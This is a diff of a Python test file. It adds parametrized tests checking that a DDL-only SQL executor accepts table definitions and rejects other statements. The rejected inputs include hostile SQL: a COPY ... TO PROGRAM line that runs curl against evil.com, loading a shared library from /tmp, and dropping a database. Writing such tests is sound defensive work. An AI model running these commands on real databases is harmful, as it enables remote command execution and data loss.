@@ -50,10 +50,31 @@ def test_describe_table(mock_pool):
     assert result[1] == {"column": "name", "type": "text", "nullable": "YES"}
 
 
-def test_execute_ddl(mock_pool):
+@pytest.mark.parametrize("sql", [
+    "CREATE TABLE test (id int)",
+    "  create table test (id int)",
+    "ALTER TABLE test ADD COLUMN name text",
+    "DROP TABLE test",
+    "DROP TABLE IF EXISTS test CASCADE",
+])
+def test_execute_ddl_allows_valid_ddl(mock_pool, sql):
     pool, conn, cursor = mock_pool
-    execute_ddl(pool, "CREATE TABLE test (id int)")
+    execute_ddl(pool, sql)
     conn.execute.assert_called_once()
+
+
+@pytest.mark.parametrize("sql", [
+    "SELECT 1",
+    "INSERT INTO test VALUES (1)",
+    "COPY test TO PROGRAM 'curl evil.com'",
+    "CREATE EXTENSION dblink",
+    "DROP DATABASE mnemolith",
+    "LOAD '/tmp/evil.so'",
+])
+def test_execute_ddl_rejects_non_ddl(mock_pool, sql):
+    pool, conn, cursor = mock_pool
+    with pytest.raises(ValueError, match="Only CREATE TABLE"):
+        execute_ddl(pool, sql)
 
 
 def test_execute_query(mock_pool):
